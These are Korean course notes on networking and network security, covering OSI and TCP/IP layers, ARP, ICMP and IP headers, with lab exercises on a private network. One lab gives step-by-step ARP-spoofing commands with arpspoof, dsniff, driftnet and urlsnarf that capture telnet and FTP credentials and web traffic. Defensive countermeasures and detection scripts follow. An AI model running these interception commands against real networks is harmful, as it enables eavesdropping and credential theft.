==========================================네트워크 해킹과 보안==========================================

1장 : 네트워크 개요

	1. 네트워크 개요
		1. 프로토콜 = 통신규약
			구문(syntax)
			의미(symentics)
			타이밍(sequence,...)
		
	2. OSI 7 Layer
		1) 물리적 계층(Physical Layer)
			Data Unit : Bit
			주요기능: 기계적, 전기적인 통신망 접명의 정의
			Device : Hub
			
		2) 데이터링크 계층(Datalink Layer) - L2TP, PPTP 
			Data Unit : Frame
			주요기능: 데이터 링크의 제어(프레임화, 데이터 투명성, 오류제어 등)
			Device : L2, Bridge
			
		3) 네트워크 계층(Network Layer) - IPsec
			Data Unit : Packet/Datagram
			주요기능: 경로배정, 주소, 호 설정 및 해지 등
			Device : L3, Router
			
		4) 전송 계층(Transport Layer)
			Data Unit : Segments
			주요기능: 종단 간의 메세지 전송(연결 관리, 에러제어, 데이터 분리, 흐름제어 등)
			Device : L4 
			
		5) 세션 계층(Session Layer) - SSL/TLS
			Data Unit : Data/Message
			주요기능: 응용개체들간의 대화, 동기화 제어, 연결세션관리 등
			Device : 
			
		6) 프레젠테이션 계층(Presentation Layer)
			Data Unit : Data/Message
			주요기능: 전송 형식 협상, 데이터의 표현 방식 변환 등
			Device : 
			
		7) 응용 계층(Application Layer) 
			Data Unit : Data/Message
			주요기능: 파일 전송, 접근 및 관리 및 문서, 메세지 교환등
			Device : L7
	
	[참고] http://www.ieft.org/rfc/rfcNNNN.txt 
	
	3. TCP/IP 5 Layer
		Application
			Protocol : DNS, DHCP, SNMP, NTP, SMTP, etc
						
PORT	Transport
			Protocol : TCP, UDP
			역할 : TCP 흐름제어 : 송신할땐 Sliding Window 수신할땐 Congestion Window
				   TCP 에러제어 : ACK로 함 
			
IP		Internet
			Protocol :ICMP, IGMP, IPv4/IPv6, ARP, RARP
			역할 : IP헤더를 가지고 라우팅하고, 송신할땐 Fragmentation(분해), 수신할땐 Reassembly(재조립)
			
MAC		Network Interface
			Protocol :Ethernet, Token Ring, FDDI, ATM, etc
			역할 : 2계층의 헤더와 테일을 이용해서 헤더와 데이터부분을 특정 알고리즘으로 넣어 CRC를 만든후 받은 CRC와 비교 
			IEEE 802.3 - Ethernet standards 
			
		Hardware
			Protocol :Transmission Media(IEEE)
	
	4. 네트워크 장비 
		1. IP-PBX : 음성통신에서 라우팅 기능을 가지고있는 장비

		
		
2. 네트워크 인터페이스 계층

	1. 개요
		1. LAN 오브젝트 : 토폴로지,전송매체,이더넷,CSMA/CD,FRAME,MAC주소관리 
	
	2. 네트워크 토폴로지
		Bus Topologies   Dummy Hub 사용하는 경우(EX: Ethernet Hub)
        Star Topologies  Switching Hub 사용하는 경우(EX: Ethernet Switch)
        Ring Topologies  Token Ring Hub 사용하는 경우	-> FDDI 는 링을2개를 돌림 
        VLAN Topologies  Virutal LAN 사용하는 경우
	
	3. 랜 전송 매체
		Wire(Cable) ----+---- Coxial Cable			 +---- FTP Cable
						|			                 |
						+---- Twisted Pair Cable ----+---- UTP Cable(CAT5e 사용중, 1000BASE-T 같은말임) 속도 : 1Gbps ------------+--Direct Cable 서로 다른 기종일때 이걸로 연결
						|                            |														|
						+---- Fiber Optical Cable    +---- STP Cable										+--Cross Cable 같은 기종일땐 크로스케이블 연결
		Wireless
		
	4. 이더넷 주요소 
		1. CSMA/CD
		2. 프레임 : |reamble(8) | D.MAC(6) | S.MAC(6) | Type(2) | DATA(46-1500) | CRC(4)|
		3. 케이블

	[참고] MAC 주소 목록 찾기 http://www.coffer.com/mac_find 

	
	
3. 실습 
	# cat /etc/resolve.conf	 외부 지정되어있어야함 
	# yum list wireshark*	
	# yum -y install wireshark wireshark-gnome	와이어샤크와 GUI환경에서 실행하기위해 2개 설치 
	# wireshark &		실행
	이더넷 설정후 -> 실행 
	# ping -c 2 192.168.20.201 핑후 와이어샤크에서 캡쳐
	
	201에도 와이어샤크 설치 (윈도우는 802.11이랑 winPcap 선택후 설치해야함)
	ping -n 2 192.168.20.200 핑후 와이어샤크 캡쳐확인
	
	
	
4. 인터넷 계층
	1. ARP  : IP -> MAC
	
		[선수지식] ARP Cache table 관리/명령어
			1. ARP 캐쉬를 최신으로 유지 
				- 각 노드는 ARP를 효율적 수행을 위해 ARP 캐쉬를 최신으로 유지하는 일이 필수이다. 
				- 캐쉬의 각 항목은 새로이 생긴 후로 20분이 지나면 자동적으로 소멸한다. (RFC 1122) 
				- 따라서, 자주 사용되는 IP/MAC를 ARP Cache Table에 Static하게 등록해 놓으면 즉각적으로 조회가 가능하다

			2. ARP 트래픽 경감
				- 만약 ARP Cache Table에 조회되는 정보가 없는 경우에만 ARP Request 패킷을 사용하기 때문에, LAN 트래픽을 경감시킨다.
			
			3. 명령어
				# arp -s <IP> <MAC>	: 설정(정적)
				# arp -a		    : 확인
				# arp -d <IP>		: 삭제 
			
			4. MAC 주소
				- MAC주소를 읽어들여 메모리에 할당후 사용 메모리에있는 MAC주소는 변경가능 BUT 가상화 환경에서
					원래 MAC 카드가 들어가있는 컴퓨터 부팅시 네트워크가 됐다 안됐다 할 수 있음 조심!!!!
					
		[실습] ARP 동작원리
			(리눅스)
				#arp -a 
				#arp -d 192.168.20.201
				#arp -a 
				#ping -c 1 192.168.20.201
				#arp -a
			(윈도우)
				arp -a
				arp -d 
				ping -n 1 192.168.20.200
				arp -a 
	
		[실습] ARP 패킷분석 
			(리눅스)
				#wireshark &
				#arp -d <IP>	목록 지우기 여기 있으면 여기있는걸 씀
				#ping -c 2 192.168.20.201	치기전에 와이어샤크 돌리고 치고 멈추기 
				
				핑을 하게되면 이더넷 프레임에 상대MAC과 나의MAC이 포함되어야 되기 때문에 ICMP전에 ARP패킷을 송수신해서 MAC주소 가져온다
				
			(윈도우)
				arp -d 
				ping -n 2 192.168.20.200
				해당 ARP는 2번밖에없다 리눅스에 ping은 자기는 확인 안하기 때문에 (참고2번참조)
			
		[실습] Ethernet Address 임시적 변경 
			(리눅스)
				# ping -c 1 192.168.20.201
				# arp -d 192.168.20.201
				# arp -s 192.168.20.201 <아무MAC주소>
				# arp -a 				-> ON 이아니라 PERM으로 된걸 확인 STATIC 이란 뜻임 리눅스에선 
				# ping 192.168.20.201	-> MAC가 바껴서 핑이 안가는걸 확인 
				(복원)
				# arp -d 192.168.20.201
				# arp -s 192.168.20.201 <원래201의 MAC주소>
			
			(윈도우)
				ping 192.168.20.200
				arp -a 					-> 200의 MAC주소 복사
				arp -d 192.168.20.200	-> 원래 있던것 삭제
				netsh interface show interface  -> 인터페이스 이름 복사 
				netsh interface ip add neighbors "로컬 영역 연결" "192.168.20.200" "00-0c-29-d1-cc-22" 	-> 정적으로 바꾸는 명령어임
				ping 192.168.20.200 	-> MAC바껴서 핑이 안감 
				netsh interface ip delete neighbors "로컬 영역 연결" "192.168.20.200" 		-> add를 delete 로 바꿔서 캐쉬테이블 내용 삭제 
				ping 192.168.20.200		-> 되는걸 확인 
				
		[실습] 외부와 통신할 경우 MAC주소
			# ping -c 1 192.168.20.201	-> 201의 MAC주소가 들어감 
			# ping -c 1 168.126.63.1	-> 외부꺼라서 라우터(100)의 MAC주소가 저장된다.
		
		[실습] alive IP확인
			ping 192.168.0.255 -t
			arp -a 
			-> (실무) 같은 네트워크 안에 alive 시스템을 확인 할 수 있다. (리눅스는 브로드캐스트 응답 안함 하나씩 확인) 
			-> (실무) MAC 주소가 중첩(충돌)이 발생한 서버의 MAC 주소를 확인 할 수도 있다.
			-> (실무) SAN 스토리지/스위치(네트워크 장비) IP를 모르는 경우 IP 확인을 위해서 사용한다.
		
		[실습] MAC주소를 파일에서변경 (리눅스)
			# cat /etc/sysconfig/network-scripts/ifcfg-eno16777736 | grep HWADDR
			# ifconfig | grep HWaddr 	-> MAC확인
			# ifconfig eno16777736 hw ether 00:0c:29:11:11:11		-> MAC주소 변경
			# ifconfig 					-> 확인
			# ifconfig eno16777736 hw ether <정상적인 MAC>			-> 복원
		
		[참고] ifconfig 명령어 사용법
			# ifconfig --help
				[hw <HW> <address>]		-> 대괄호 안은 생략이 가능한 것 
				따라서 ifconfig eno16777736 hw ether <정상적인 MAC> 이러한 모양 
		
		[참고] 와이어샤크
			MAC주소 뒤에 괄호는 원래 괄호인데 앞에 내용으로 바꿔서 쓴것임 ()내용이 원래내용
			핑을 줄때 윈도우로하면 윈도우는 반대로 브로드캐스트해서 자기도 MAC주소를 확인해 본다 
			
		[실습] 쉘 스크립트를 이용해 ping 통신하는 프로그램 제작  
			원리 : ping 테스트 (192.168.20.200 ~ 192.168.20.205)
				   arp cache table (arp -an)
	
	
	2. ARP 스푸핑
		1. IP spoofing
			1. proxy와 vpn사용 => proxy chain(TOR) 을 이용해 공격
				proxy chain : 프록시를 여러개 묶은것 
				공격 : 1. 공격자가 타겟에 정보를 요청
					   2. 그 과정에서 TOR(토르) 네트워크 즉 여러 프록시네트워크 거침
					   3. 토르 네트워크는 하나를 지날때 마다 기본적으로 국가망을 거치기 때문에 송신자를 알수가없다
			
			2. 캐빈미트닉 공격
				조건 : A와 B는 신뢰관계에 있다 
				공격 : 1. 공격자는 A를 DOS공격해서 서비스 불가로 만듬
					   2. 공격자는 A가 보낸것처럼 B에 데이터보냄
					   3. B는 해당 데이터에 A에게 응답 but A는 서비스 불가상태라 응답불가
					   4. 공격자는 A가 보낼 응답을 자신이 A가 보낸것처럼 보내서 신뢰간계를 뺏음 
				
		2. DNS spoofing
			공격 : 1. 공격자가 가짜 DNS 사이트 만듬
				   2. 가짜 웹페이지 구성
				   3. 희생자가 DNS에게 요청할때 중간에있는 가짜 DNS에도 요청이 감
				   4. 이때 먼저들어온 IP를 사용하기 때문에 가짜 웹페이지가 요청됨 
				   5. 해당 웹페이지 들어가는 순간 바이러스 감염이 됨 
		
		3. DHCP spoofing
			사전지식 : DHCP Discover(클라가 브로드캐스트) -> offer(DHCP서버의 응답) -> request -> ack 
			공격 : 1. 공격자가 가짜 DHCP서버 구성 
				   2. 공격자는 여러 DHCP중 자기한테 신호를 받게하기 위해서 offer라는 메세지를 계속 뿌림 
				   3. 따라서 게이트웨이를 공격자의 DHCP서버로 구성 
				   4. 모든 패킷이 가짜 DHCP서버를 지나감 
		
		4. ARP spoofing 
			공격 : 1. A와 B사이에 공격자가 있다고 가정
				   2. 공격자가 reply 를 A에게 보냄
				   3. reply를 받은 A는 B의IP와 공격자의 MAC을 가지고 테이블에 저장
				   4. reply를 받은 B는 A의IP와 공격자의 MAC을 가지고 테이블에 저장 
				   5. MAC이 잘못되면 전송이 안되기 때문에 공격자에게 모든 통신이감
				   6. 공격자는 이 통신내용을 포워딩해서 원래 사용자에게 돌려줌 
			
			대응 : request를 보내지 않았는데 reply가 오면 테이블에 저장을 하지 않는다. 
			
			공격 : 1. 위 대응에 대해서 reply를 계속 보낸다 
				   2. 이때 언젠간 A와 B가 통신을 하게된다
				   3. 공격자가 보낸 reply가 등록된다
				   4. 테이블이 공격자가 원하는대로 저장 
			
			[실습] ARP Spoofing 1 ( 같은 로컬에 있는 pc1과 pc2 패킷 보기 )
				linux200,kali,win2008 아이피와 MAC 적어두기
				(공격)
					1. 각각 캐시테이블 정보 지우기
					2. 칼리리눅스에서 # nmap -F 192.168.20.0/24  공격 대상 찾기 
					3. 칼리에서 포워딩 기능 ON 시키기 
						# vi /etc/sysctl.conf		-> 설정
						# net.ipv4.ip_forward=1		-> 설정하기
						# sysctl -p					-> 재동기화
						# sysctl -a | grep ip_forward	-> 확인
					4. 칼리에서 와이어샤크 실행 eth1(내부) 실행
						(참고) apt-get -y install dsniff 가 있어야함 
					5. 칼리 새로운 터미널에서
						# arpspoof -i eth1 -t 192.168.20.200 192.168.20.201	(201의 MAC주소는 칼리의 MAC주소다)
						# arpspoof -i eth1 -t 192.168.20.201 192.168.20.200	(200의 MAC주소는 칼리의 MAC주소다)
					6. 리눅스와 윈도우 arp -a 했을때 안보임 이유는 리퀘스트가 없었기 때문에
					7. 칼리에서 # dsniff -i eth1 -t 23/tcp=telnet host 192.168.20.200 	tcp23번을 감청한다 200번의 
					8. 윈도우 2008에서 telnet 192.168.20.200 하면 7번칼리에서 나옴
					9. 칼리에서 # dsniff -i eth1 -t 21/tcp=ftp host 192.168.20.200	ftp의 21번 감청 200번의
					10. 윈도우에서 ftp 192.168.20.200		접속이 잘 됨 하면 9번 칼리 터미널 에서 나옴 
					11. 통신을 하게 되고나서 arp -an 리눅스에서 그리고 arp -a 윈도우에서 그러면 MAC주소가 둘다 칼리로 되어있음
				(복원)
					1. 칼리리눅스 프로그램 모두 종료 
					2. 리눅스 에서 arp -a 하면 자동으로 원래대로 돌아옴 
					3. 윈도우에서 arp -a 하면 자동으로 원래대로 돌아옴 
			
			[실습] ARP Spoofing 2 ( pc1과 밖으로 나가는 router(firewall) 패킷 보기 )
				(공격)
					1. arp -d 로 윈도우 테이블 지우기 
					2. firewall 에서 게이트웨이 빼고 다 지우기 
					3. 윈도우2008에서 서버관리자 -> IE ESC구성 사용안함 하기 
					4. 윈도우2008에서 구글 크롬 설치 
					5. 칼리에서 #arp -d 로 200,201,100 지우기
					6. 칼리에서#nmap -F 192.168.20.0/24		-> 100과 201 이 나와야함
					7. 칼리에서#wireshark &	-> eth1 사용 
					8. 칼리에서#arpspoof -i eth1 -t 192.168.20.100 192.168.20.201	201의 아이피에게 100mac주소를 칼리로 속인다 
					9. 칼리에서#arpspoof -i eth1 -t 192.168.20.201 192.168.20.100	100의 아이피에게 201mac주소를 칼리로 속인다 
					10.칼리에서 # driftnet -i eth1 이미지를 잡는 용도 
					11.칼리에서 # urlsnarf -i eth1 eth1의 url검색을 잡는다
					12.칼리에서 # firefox & 실행 
				(복원)
					1. 칼리리눅스 프로그램 모두 종료 
					2. 리눅스 에서 arp -a 하면 자동으로 원래대로 돌아옴 
					3. 윈도우에서 arp -a 하면 자동으로 원래대로 돌아옴 
			
			[참고] ARP 공격에 대한 대응
				(증상)
					1. 네트워크 부하량 걸린다?
					2. arp -a 중복된 MAC주소 존재?!
					3. arp cache table에 static 상태로 정보를 넣는다.
				(예방)
					1. 서버장비에서 방어 	 : static arp table 설정
					2. 네트워크장비에서 방어 : Port Security 기능 사용 
				(관리자 대응)
					1. 감염 대상 파악
					2. 하위 네트워크 PC 치료
					3. 장비 재정비
				(향후 예방 조치)
					1. 게이트웨이 장비에 수동으로 ARP Table 할당
					2. arp 스푸핑 공격 모니터링 (arp watch)
			
			[실습] Static 하게 ARP Cache Table에 라우터의 MAC주소를 등록하는 프로그램 제작 
				아이디어 : 1. 서버 동작 프로그램
						   2. arp cache table을 확인해서 같은 MAC 주소를 갖는 IP가 있는지 확인 
				# cd /root/bin
				# vi arp.sh
					#!/bin/bash

					ROUTER_IP=192.168.20.100

					ping -c 1 $ROUTER_IP > /dev/null 2>&1
					if [ $? -eq 0 ] ; then
        					MAC=`arp -an | grep $ROUTER_IP | awk '{print $4}'`
        					arp -s $ROUTER_IP $MAC
					fi
				
				# chmod 700 arp.sh	실행권한주기
				# ./arp.sh			실행 
				# arp -an			확인 PERM 
				# vi /etc/rc.local	부팅시 실행할 프로그램 넣는곳
					/root/bin/arp.sh 넣기
				# chmod +x /etc/rc.local
				# systemctl start rc-local	다시 시작하기
				# systemctl status rc-local 액티브한지 보기 
				# reboot
				# arp -an 
				(복원)
				# vi /etc/rc.local 에서 조작한거 주석처리 
				
				[참고] 
				# systemctl list-unit-files	모든 프로그램 보는것 
				
			[실습] 주변 서버와 통신 후 살아있는 서버 찾고 임시화일에 저장하고 중복하는게 있으면(arp스푸핑인걸 알수있음) 출력 
				
				# vi arpwatch.sh
					#!/bin/bash
					#	#crontab -e 
					#	1 * * * * /root/bin/arpwatch.sh
					
					NetAddr=192.168.20
					TempFile=/tmp/tmp1
					LogFile=/var/log/ARPSpoof.log
					
					for i in $(seq 200 205)
					do
						ping -c 1 $NetAddr.$i > /dev/null 2>&1
					done
					
					arp -an > $TempFile
					MACCOUNT=$(cat $TempFile | awk '{print $4}' | sort | uniq -d | wc -l)
					
					if [ $MACCOUNT -ge 1 ] ; then
						echo "[ WARN ] : $(date) arp spoofing detected." >> $LogFile
					else
						echo "[  OK  ] : $(date) Have a good time." >> $LogFile
					fi
				# chmod 700 arp.sh	실행권한주기
				# ./arp.sh			실행 
				# cat /var/log/ARPSpoof.log
				
			[실습] 의미없는 ARP 패킷 분석
				생성이유 : 
					(ㄱ) 장치의 IP 주소를 변경하면 의미 없는 패킷이 생성된다.
					(ㄴ) 일부 운영체제는 시작할 때 의미 없는 ARP를 수행한다.
					(ㄷ) 일부 시스템에서는 로드 밸런스 조정을 지원하기 위해 의미 없는 ARP 패킷을 사용한다. 
				
				사용 이유 : 
					IP가 바뀌면 나의 MAC테이블에 있던 예전 IP와 MAC에 대해서 매칭되어있는것을 갱신하기 위해서 
				
				[참고]
					네트워크 유닉스 리눅스는 IP변경을 위해서 뿌림 
				
				(디바이스 이름 변경)
					eno16777736 -> eth0 으로
					(방화벽)
						1. ifconfig -> 이름 확인 eno16777736 와 eno33554976
						2. # cd /etc/sysconfig/network-scripts
						3. # ls -lh ifcfg-* 명령어 확인후 이름이 위의 디바이스와 같은이름이있는지 확인
						4. # cat ifcfg-eno16777736 | grep name		eth0으로 변경
						5. # cat ifcfg-eno33554976 | grep name		eth1로 변경
						6. # vi /etc/default/grub
							GRUB_CMDLINE_LINUX="rd.lvm.lv=centos/root rd.lvm.lv=centos/swap crashkernel=auto rhgb quiet net.ifnames=0 biosdevname=0" 추가 
								● grub에서 BIOS 장치이름을 Network Interface 이름으로 사용하지 않겠다고 선언한다.
								● 커널 업그레이드가 되면 grub 패러미터값을 다시 설정해 줘야 하는 불편함을 없애기 위해서 grub 기본설정을 변경한다.
								● GRBU_CMDLINE_LINUX 라인의 맨 뒤에 net.ifnames=0 biosdevname=0 입력한다.
						7. # grub2-mkconfig -o /boot/grub2/grub.cfg
							● /boot/grub2/grub.cfg 파일 재생성
						8. # cd /etc/sysconfig/network-scripts
						9. # mv ifcfg-eno16777736 ifcfg-eth0
						10.# mv ifcfg-eno33554976 ifcfg-eth1
						11.# vi /etc/udev/rule.d/90-eno-fix.rules
							맨뒤에 eno16777736 -> eth0 이런식으로 2개 바꿈 
						12.# reboot
						13.# nmcli device ->확인
					(리눅스)
						위와 같이 하면 됨
						
				(분석) 
					1. 윈2008에서 와이어샤크 실행 ( 로컬영역연결 ) 
					2. 리눅스200에서 IP변경(204로)
					3. 리눅스200에서 # nmcli connection show eth0 | grep ipv4 으로 상태보기 
					4. # nmcli connection modify eth0 ipv4.addresses 192.168.20.204/24	로 아이피 바꾸기
													  ipv4.gateway 192.168.10.2
													  ipv4.dns 168.126.63.1			이런식으로 바꾸기 
													  ipv4.method manual		
					5. # nmcli connection up eth0		-> 하는순간 업데이트 되는것임 
					6. 다시 위에 순서 로 204 -> 200으로 바꾸고 5번과정은 하지 않고 윈도우로 넘어감
					7. 윈도우에서 패킷잡고 리눅스에서 5번명령어 실행
					8. 그럼 의미없는 패킷 나옴 ( 리퀘스트만 있고 리플라이는 안옴 ) 
					
					
					1. 리눅스200에서 와이어샤크 실행 ( eth0 ) 
					2. 윈도우에서 ip변경(205로)
					3. 리눅스 와이어샤크 돌리고 윈도우 변경 확인
					4. 와이어샤크 필터에
						! nbns && ! ntp && ! ip.addr == 224.0.0.252 && ! dns && ! igmp && ! dhcpv6 해서 arp만 남기기 
					5. arp리퀘스트를 205번으로 날림 3번 => 있으면 충돌나기때문에 바꾸면 안돼서 
									
				(분석결과)
					1. 인텔카드에서 리퀘스트로 브로드캐스트해서 보냄 
					2. 보내는 IP와 도착 IP가 같음
					3. 윈도우와 Linux는 방식이 다르다. 

	3. RARP
		역할 
			MAC -> IP 로 바꿔줌 
		사용 클라이언트
			DHCP
	
	4. ICMP 
		ICMP란
			호스트 서버와 인터넷 게이트웨이 사이에서 메시지 제어하고 에러 알려주는 프로토콜
		
		ICMP 프로토콜
			ping CMD
			traceroute CMD
		
		ICMP Type 
			Type 3 : Destination Unreachable
				Code 0 : Network Unreachable		
					-목적지 네트워크로 가는 경로가 없음
					-목적지 주소가 라우팅 테이블에 없을 경우
					-디폴트 라우터가 없는 경우
				Code 1 : Host Unreachable		
					-최종 목적지 호스트에 도달할 수 없을 때
					-호스트 또는 라우터에서 생성됨
				Code 2 : Protocol Unreachable	
					-목적지 시스템에 특정 프로토콜을 사용할 수 없다는 사실을 통보
				Code 3 : Port Unreachable
					-목적지 호스트에서 특정 포트번호가 사용 될 수 없음을 알림
				Code 4 : Fragmentation Needed and Don't Fragment was Set
					-IP 데이터그램에 MTU가 작은 네트워크를 통과하려면 단편화되어야하는데, 라우터는 DF 비트가 세팅된 것을 확인하고 폐기후 송신측에 통보
			Type 5 : Redirect
			Type 0 : echo reply
			Type 8 : echo request
				Type 9 : Router Advertisement 
			Type 10: Router Selection 
		
		[참고] ICMP 메시지
			https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#
			
		[실습] ICMP 패킷을 캡쳐하고 분석 
			개념 :
				ping 동작원리 		: A -> B (echo Request) B -> A (echo reply,destination Unreachable)
				traceroute 동작원리	: TTL값을 하나씩 늘리면서 도착지 까지 어디를 들리는지 알수있다.
			(분석)
				(리눅스->win2008)
					1. win7 종료 
					2. 리눅스200에서 와이어샤크 실행
					3. 리눅스200에서 win2008(201)로 핑테스트
					4. 패킷잡음.
					5. 리눅스에서 ping하면 id값은 다 같음 seq는 1씩 늘어남 데이터는 48바이트(가비지데이터) ttl값은 리눅스 64
				(win2008->리눅스)
					1. 윈2008에서 와이어샤크 실행 
					2. ping 192.168.20.200 해서 패킷 잡음
					3. 윈도우에서 ping하면 id값은 다 같음 seq도 1씩 늘어남 데이터는 32바이트(가비지데이터) ttl값은 윈도우 128	시스코는255임
				(리눅스->win7(꺼져있음))
					1. 리눅스에서 와이어샤크 실행
					2. ping -c 4 192.168.20.202
					3. 패킷 분석하면 ICMP가 가지 않기 때문에 ICMP패킷이 없음
				(리눅스->123.123.123.123으로)
					1. 리눅스 와이어샤크 실행
					2. ping -c 4 123.123.123.123
					3. 패킷 분석하면 ICMP가 가지 않지만 패킷은 있음 request만있고 reply는 없음 
		
		[실습]Destination Unreachable - Port Unreachable
			사용 시스템 : win2008,linux200
				(분석)
					1. 리눅스200에서 win2008 서버에 열린 포트를 확인한다.
						# nmap 192.168.20.201	[설치] yum -y install namp nmap-frontend
						-> ftp(tcp)포트가 열려져있는지 확인 
						# nmap -p 21 192.168.20.201		-> 21번 포트가 열려있는지 확인
					2. 리눅스200에서 와이어샤크 실행 
					3. 리눅스에서 nmap -sU -p 21 192.168.20.201		(-sU : UDP를스캔하는옵션)
						툴에서 21번 udp는 close상태임 
					4. 패킷을 캡쳐하면 201에서 200한테 Destination unreachable 을 보냈다. 
						! dns && ! browser && ! eth.addr == xx:xx:xx:xx 패킷필터링 하는 것. 
				(결론)
					1. tcp 서비스 포트에 udp패킷을 ftp(21)로 전송했기 때문에 이렇게 나온것이다. 
					2. ICMP는 포트가 없다.
						3계층역할이고 IP로 캡슐화되고 위에는 UDP와 IPv4가 있다 이러한 이유는 상대방에서 보내온거기 때문이다???
		
		[실습]Destination Unreachable - Network Unreachable
			(분석)
				1. HostOS에서 네트워크 Gateway 정보를 삭제 
				2. 리눅스200에서 와이어샤크 실행 
				3. 리눅스200에서 외부로 핑테스트
				4. pinc -c 2 168.126.63.1
				5. 패킷을 캡쳐하면 10.2 가 200한테 Network Unreachable 을 보낸다.
			(결론)
				1. 중간 네트워크단의 라우팅 경로가 잘못된 경우 
		
		[실습]Network is unreachable 
			(분석)
				1. 리눅스200에서 Gateway 정보를 삭제 
					nm-connection-editor & 하고 eth0부분의 ipv4 게이트웨이 삭제 -> nmcli connection up eth0 
				2. 리눅스에서 와이어샤크 기동 
					결과로 network is unreachable 가 나옴
				3. 패킷은 나오지 않음 
				4. 127.0.0.1 해도 안나옴
				5. 200번으로 보내도 안나옴
			(결론)
				1. 운영체제 스스로가 응답을 해주기때문에 NIC카드로 나가지 않는다 따라서 패킷이 잡히지 않는다. 
				
		[실습]traceroute 명령어 실행 패킷 분석
			사용시스템 : win2008, firewall
				(분석)
					1. win2008에서 traceroute 실행화면 분석 
						> tracert 168.126.63.1
						=============================================================
						최대 30홉 이상의
						kns.kornet.net [168.126.63.1](으)로 가는 경로 추적:
  							1    <1 ms    <1 ms    <1 ms  192.168.20.100			ICMP echo request를 3번보냄 
 							2     1 ms     1 ms     1 ms  192.168.10.2
 							3     2 ms     2 ms     2 ms  192.168.0.1
 							4     *        4 ms     4 ms  112.221.84.57				*표시는 ICMP echo request 를 보냈을때 reply신호를 안주면 *로 남음 
 							5     3 ms     4 ms     3 ms  10.18.219.133				 또한 보안장비는 ICMP에 응답을 안하기 때문에 *표시가 뜸 
 							6     3 ms     2 ms     2 ms  1.213.1.125
 							7     3 ms     3 ms     2 ms  1.208.1.53
 							8    10 ms     7 ms     7 ms  1.208.104.73
 							9     4 ms     4 ms     4 ms  1.213.145.222
							10    5 ms     7 ms     7 ms  203.229.222.141
							11    6 ms     7 ms     9 ms  112.174.14.25
							12    4 ms     4 ms     3 ms  kns.kornet.net [168.126.63.1]
							추적을 완료했습니다.
						=============================================================
					2. win2008에서 와이어샤크 실행
					3. win2008에서 tracert 168.126.63.1 실행
					4. TTL 을 1씩 늘려가며 앞에 잇는 노드의 IP를 가져와서 추적을 하는걸 볼 수 있음
					(결론)
					ICMP echo request 3개 보내고, 각 노드에 보내지는 TTL 값을 1부터 증가시켜가면서 
					목적지에 도달할때 까지 보낸다.
		
		[실습] VisualRoute 프로그램 사용하기 
			사용시스템 : win2008 
			1. http://www.visualroute.com 에서 다운로드 -> all Editions 다운로드
			2. jre-8u91-windows-i586 다운로드 -> 설치 
			3. 1에서 받은거 실행 -> 되는걸 확인 
			4. 실행후 url창에 www.google.co.kr 패킷이 어떻게 가는지 확실하게 알수있다 눈에 확 들어옴!!!!!!
		
		[실습] Open Visual TraceRoute
			사용시스템 : win2008
			1. https://sourceforge.net/projects/openvisualtrace/
	
	5. IP
		1. IP 헤더 분석
			윈도우 2008 -> 리눅스200으로 PING2번 
				1. Version(4 bits)
					IPv4, IPv6
				
				2. IP Header Length (4 bits)		-> 중요!
					20bytes ~ 60bytes
				
				3. Type Of Service (8 bits)
					8비트중 3비트(우선순위설정) 4비트(TOS설정용) 마지막1비트 사용X
				
				4. Total Length (16 bits)		
					IP와 밑에 ICMP까지포함 IP가 20이니깐 밑에 ICMP는 40	결과가 60으로 나옴
				
				5. Identification (16 bits) 		-> 중요!
					분할해서 보내면 조립하기위해서 사용하는것
				
				6. Flag (3 bits)					-> 중요!
					3bit -> 1 : 사용x 항상 0
						 -> 2 : 0이면 분할 가능 1이면 분할 불가능
						 -> 3 : 0이면 마지막조각 1이면 마지막조각이 아님 
				
				7. Fregmentation Offset (13 bits)	-> 중요!
					4계층에서 온것이 4000byte면 3계층인 인터넷계층에서 2계층에서 MTU 크기(IP헤더와 DATA포함)이 1500byte라 햇을때
					인터넷계층에서 이걸 나눈다 나누는것을 MSS라 하고 이는 아이피헤더20을 뺀 1480이 된다 
					이렇게 하면 총 3개가 나오는데 4000을 -> 1480, 1480, 1040 이 된다 
					각각 ID와 Flag와 offset이 IP헤더에 붙는다
					
					1번째 패킷
						ID		: 1111
						flag	: X01
						offset	: 0		첫번째라서 0부터시작
					2번째 패킷
						ID		: 1111
						flag	: X01	불할가능 마지막X
						offset	: 1480	두번째라서 1480부터 시작
					3번째 패킷
						ID		: 1111
						flag	: X10	분할불가능 마지막
						offset	: 0		세번째라서 2960부터 시작 
				
				8. TTL (8 bits)
					대부분 홉으로 되어있고 요즘 전체 네트워크에서 살아있을수있는 시간으로 정의하기도 함
					리눅스(64), 윈도우즈(128), 유닉스(256)을 부여
				
				9. Protocol (8 bits)
					ICMP : 1번
					IGMP : 2번
					TCP  : 6번
					UDP  : 17번
				
				10.Checksum (16 bits)
					헤더에 대한 오류 검출(데이터 제외)
					에러확인을 위한 16비트 필드

				11.Source IP Address (32 bits)
					출발지 IP 주소이다.

				12.Destination IP Address (32 bits)
					목적지 IP 주소이다.

				13.IP 헤더 옵션(선택 옵션)
					가변 길이 bits
		
		[실습] 패킷분석 - IP 단편화 
			사용시스템 : 윈도우 2008, kali
			1. 칼리에서 와이어샤크실행 -> eth1 번 실행 -> 오른쪽밑 프로파일에서 출발도착 mac주소와 port 넣어서 돌리기
			2. 칼리에서 ping -s 4000 -c 1 192.168.20.201	-s옵션으로 패킷의 사이즈를 4000바이트로 바꿔서 보내기
			3. 패킷 분석 
		
		[참고] MTU (Maximum Transfer Unit)
			DIX Ethernet : 1,500byte
			(리눅스)
				#ifconfig	첫줄맨 뒤에 mtu값있음
			(윈도우)
				>netsh interface ip show interface : MTU값 표시되어잇음
		
		2. IPv4 정리
			1. IPv4 : XXX.XXX.XXX.XXX (32bits 주소, 10진수, 4 octet)
				   172.16.9.200  

			2. 클래스별(Class) IP 대역
				A Class : 0   ~ 127	(예) 10.10.10.21
				B Class : 128 ~ 191	(예) 191.32.80.120
				C Class : 192 ~ 223	(예) 203.211.5.3
				D Class : 224 ~ 239	(예) 224.0.1.9
				E Class : 240 ~ 255	
 						 
			3. [참고] 8bits (0-255)
				128 64 32 16 8  4  2  1
				1  0  0  0  0  0  0  0  : 128 (256 - 128 = 128)
				1  1  0  0  0  0  0  0  : 192 (256 - 192 = 64)
				1  1  1  0  0  0  0  0  : 224 (256 - 224 = 32)
				1  1  1  1  0  0  0  0  : 240 (256 - 240 = 16)
				1  1  1  1  1  0  0  0  : 248 (256 - 248 = 8)
				1  1  1  1  1  1  0  0  : 252 (256 - 252 = 4)
			
			4. 사설 IP(Private Address)
				A Class : 10.X.X.X
				B Class : 172.16.X.X ~ 172.31.X.X
				C Class : 192.168.X.X
